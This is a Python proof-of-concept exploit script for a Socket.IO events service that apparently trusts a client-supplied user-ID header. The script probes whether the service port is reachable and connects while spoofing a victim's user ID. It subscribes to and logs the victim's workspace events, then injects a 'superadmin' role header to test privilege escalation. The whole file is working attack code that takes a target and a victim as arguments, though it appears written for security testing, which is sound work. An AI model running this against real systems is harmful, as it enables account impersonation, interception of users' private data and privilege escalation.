#!/usr/bin/env python3
"""
PoC #3 — Socket.IO User Impersonation via Direct Port Access
CRITICAL: Events service (port 3004) trusts x-prismeai-user-id header.
Auth middleware skips if userId is already set from header.

Usage: python3 poc_03_socketio_impersonation.py --target dev.example.com --port 3004 --victim-user-id USER_ID
"""

import argparse
import json
import time

try:
    import socketio
except ImportError:
    print("[!] Install: pip3 install python-socketio[client] websocket-client")
    exit(1)


def test_header_impersonation(host, port, victim_user_id, workspace_id=None):
    """Connect to events service directly with spoofed user header."""
    print(f"\n[*] Connecting to {host}:{port} with spoofed x-prismeai-user-id: {victim_user_id}")

    sio = socketio.Client(
        reconnection=False,
        logger=False,
        engineio_logger=False,
    )

    events_received = []
    connected = False

    @sio.event
    def connect():
        nonlocal connected
        connected = True
        print("  [CRITICAL] Connected to Socket.IO as impersonated user!")
        print(f"  SID: {sio.sid}")

        # Subscribe to victim's events
        if workspace_id:
            print(f"  [*] Subscribing to workspace events: {workspace_id}")
            sio.emit("subscribe", {
                "workspaceId": workspace_id,
                "userId": victim_user_id,
            })

    @sio.event
    def connect_error(data):
        print(f"  [INFO] Connection error: {data}")

    @sio.event
    def disconnect():
        print("  [INFO] Disconnected")

    @sio.on("*")
    def catch_all(event, data):
        events_received.append({"event": event, "data": data})
        print(f"  [CRITICAL] Received event as victim: {event}")
        print(f"    Data: {json.dumps(data, default=str)[:500]}")

    @sio.on("event")
    def on_event(data):
        events_received.append(data)
        print(f"  [CRITICAL] Received 'event' as victim:")
        print(f"    {json.dumps(data, default=str)[:500]}")

    url = f"http://{host}:{port}"
    headers = {
        "x-prismeai-user-id": victim_user_id,
    }

    try:
        sio.connect(
            url,
            headers=headers,
            transports=["websocket"],
            wait_timeout=10,
        )

        if connected:
            print(f"\n  [*] Listening for victim's events for 15 seconds...")
            time.sleep(15)
            print(f"\n  [*] Events received: {len(events_received)}")
            if events_received:
                print("  [CRITICAL] Successfully intercepted victim events!")
        else:
            print("  [INFO] Connection established but connect event not fired")

    except socketio.exceptions.ConnectionError as e:
        print(f"  [INFO] Connection failed: {e}")
        print("  [INFO] Port may not be directly accessible")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False
    finally:
        if sio.connected:
            sio.disconnect()

    return connected


def test_impersonation_with_role(host, port, victim_user_id):
    """Also inject x-prismeai-role header for privilege escalation."""
    print(f"\n[*] Testing with SuperAdmin role header injection...")

    sio = socketio.Client(reconnection=False)
    connected = False

    @sio.event
    def connect():
        nonlocal connected
        connected = True
        print("  [CRITICAL] Connected as SuperAdmin-impersonated user!")

    @sio.event
    def connect_error(data):
        print(f"  [INFO] Connection error: {data}")

    url = f"http://{host}:{port}"
    headers = {
        "x-prismeai-user-id": victim_user_id,
        "x-prismeai-role": "superadmin",
    }

    try:
        sio.connect(url, headers=headers, transports=["websocket"], wait_timeout=10)
        if connected:
            print("  [CRITICAL] SuperAdmin role accepted via header!")
            time.sleep(2)
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False
    finally:
        if sio.connected:
            sio.disconnect()

    return connected


def test_port_accessibility(host, port):
    """Check if the events service port is directly accessible."""
    print(f"\n[*] Checking if {host}:{port} is directly accessible...")
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        result = sock.connect_ex((host, int(port)))
        if result == 0:
            print(f"  [HIGH] Port {port} is OPEN — events service directly accessible!")
            return True
        else:
            print(f"  [OK] Port {port} is closed/filtered")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(description="PoC #3: Socket.IO User Impersonation")
    parser.add_argument("--target", required=True, help="Target hostname")
    parser.add_argument("--port", default="3004", help="Events service port (default: 3004)")
    parser.add_argument("--victim-user-id", required=True, help="User ID to impersonate")
    parser.add_argument("--workspace-id", default=None, help="Workspace to subscribe to")
    args = parser.parse_args()

    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Victim User ID: {args.victim_user_id}")
    print("=" * 60)

    results = {}
    results["port_accessible"] = test_port_accessibility(args.target, args.port)

    if results["port_accessible"]:
        results["header_impersonation"] = test_header_impersonation(
            args.target, args.port, args.victim_user_id, args.workspace_id
        )
        results["role_escalation"] = test_impersonation_with_role(
            args.target, args.port, args.victim_user_id
        )
    else:
        print("\n  [INFO] Port not accessible — try from within the network")
        results["header_impersonation"] = False
        results["role_escalation"] = False

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE / UNREACHABLE'}")


if __name__ == "__main__":
    main()
